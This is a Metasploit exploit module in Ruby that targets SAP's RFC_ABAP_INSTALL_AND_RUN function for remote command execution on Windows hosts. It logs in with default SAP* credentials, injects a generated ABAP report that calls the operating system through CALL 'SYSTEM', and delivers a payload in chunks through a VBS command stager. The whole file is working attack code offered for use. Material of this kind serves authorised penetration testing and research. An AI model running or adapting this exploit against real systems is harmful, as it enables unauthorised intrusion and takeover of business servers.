##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy. 
# I’d also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'rubygems'
begin
  require 'nwrfc'
rescue LoadError
  abort("[x] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.")
end

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::CmdStagerVBS
  include Msf::Exploit::EXE

  include NWRFC

  def initialize
    super(
      'Name'           => 'SAP RFC_ABAP_INSTALL_AND_RUN',
      'Version'        => '$Revision: $0.1',
      'Description'    => %q{
                              This module exploits an arbitrary command execution vulnerability in the RFC_ABAP_INSTALL_AND_RUN Remote Function Call to deliver a custom payload. We're limited to approx. 256 chars, so don't set a PAYLOAD_SPLIT value higher than 250 to be on the safe side.
                              The module also requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc). 
                            },
                              
      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Privileged'     => true,
      'DefaultOptions' =>
                                {
                                },
      'Payload'        =>
                                {
                                #'BadChars' => "\x00\x3a\x3b\x3d\x3c\x3e\x0a\x0d\x22\x26\x27\x2f\x60\xb4",
                                },
      'Platforms'      => [ 'win' ],
      'Targets'        =>
                          [
                            [
                              'Windows Universal',
                               {
                                 'Arch' => ARCH_X64,
                                 'Platform' => 'win'
                               },
                            ],
                          ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 01 2012',
      'Author'         => [ 'nmonkee' ],
      'License'        => MSF_LICENSE
       )
    register_options(
                     [
                       OptString.new('USER', [true, 'Username', 'SAP*']),
                       OptString.new('PASS', [true, 'Password', '06071992']),
                       OptString.new('CLIENT', [true, 'Client', '001']),
                       OptString.new('SRHOST', [false, 'SAP router address', nil]),
                       OptString.new('SRPORT', [false, 'SAP router port number', nil]),
                       OptBool.new('VERBOSE', [false, "Be verbose", false])
                     ], self.class)
    register_advanced_options(
                              [
                                OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments', '250']),
                              ], self.class)
  end

  def exploit
    $first_run = true
    linemax = datastore['PAYLOAD_SPLIT']
    print_status("Using custom payload size of #{linemax}") if linemax != '250'
    execute_cmdstager({ :delay => 0.35, :linemax => linemax })
    handler(nil)
  end

  def execute_command(cmd, opts)
    user = datastore['USER'] if datastore['USER']
    pass = datastore['PASS'] if datastore['PASS']
    if datastore['CLIENT']
      client = datastore['CLIENT'] if datastore['CLIENT'] =~ /^\d{3}\z/
    end
    rport = datastore['rport']
    rport = rport.to_s.split('')
    sysnr = rport[2]
    sysnr << rport[3]
    rhost = datastore['rhost']
    verbose = datastore['VERBOSE']
    if datastore['SRHOST']
      if datastore['SRPORT']
        rhost = "H/#{datastore['SRHOST']}/S/#{datastore['SRPORT']}/H/#{rhost}/S/#{rport}"
      end
    end
    auth_hash = {"user" => user, "passwd" => pass, "client" => client, "ashost" => rhost, "sysnr" => sysnr}
    begin
      conn = Connection.new(auth_hash)
    rescue NWError => e
      print_error("#{rhost}:#{rport} [SAP] login failed - credentials incorrect for client: #{client} username: #{user} password: #{pass}") if e.message =~ /Name or password is incorrect/  
      print_error("#{rhost}:#{rport} [SAP] login failed - client #{client} does not exist") if e.message =~ /not available in this system/
      print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (refused)") if e.message =~ /Connection refused/
      print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (unreachable)") if e.message =~ /No route to host/
      print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (hostname unknown)") if e.message =~ /unknown/
      print_error("#{rhost}:#{rport} [SAP] login failed - #{user} user account locked in client #{client}") if e.message =~ /Password logon no longer possible - too many failed attempts/
      print_error("#{rhost}:#{rport} [SAP] login failed - password must be changed for #{client}:#{user}:#{pass}") if e.message =~ /Password must be changed/
      abort
    end
    print_good("#{rhost}:#{rport} [SAP] Successful login - #{client}:#{user}:#{pass}") if $first_run == true
    print_good("#{rhost}:#{rport} [SAP] Injecting payload via RFC_ABAP_INSTALL_AND_RUN RFC. We're limited to approx. 256 chars, be patient!") if $first_run == true
    begin
      function = conn.get_function("RFC_ABAP_INSTALL_AND_RUN")
      fc = function.get_function_call
    rescue NWError => e
      print_error("[SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
      abort
    end
    code = "REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING." + "\r\n"
    code << "TYPES lt_line(255) TYPE c." + "\r\n"
    code << "DATA lv_cmd(255) TYPE c." + "\r\n"
    code << "DATA lt_result TYPE STANDARD TABLE OF lt_line WITH HEADER LINE." + "\r\n"
    code << "lv_cmd = "   
    cmd.each do |payload|
      split_str = payload.strip
      payload_arr = split_str.scan(/.{1,20}/)
      payload_arr.each do |small_payload|
        if small_payload == payload_arr.last
          code << "'#{small_payload}'." + "\r\n"
        elsif
          code << "'#{small_payload}' &" + "\r\n"
        end
      end
    end 
    code << "CALL 'SYSTEM' ID 'COMMAND' FIELD lv_cmd" + "\r\n"
    code << "ID 'TAB' FIELD lt_result-*sys*." + "\r\n"
    code << "LOOP AT lt_result." + "\r\n"
    code << "WRITE : / lt_result." + "\r\n"
    code << "ENDLOOP." + "\r\n"
    code.each {|line|
      fc[:PROGRAM].new_row {|row| row[:LINE] = line.strip}
    }
    begin
      fc.invoke
    rescue NWError => e
      print_error("[SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
    end
    $first_run = false
    conn.disconnect
  end
end
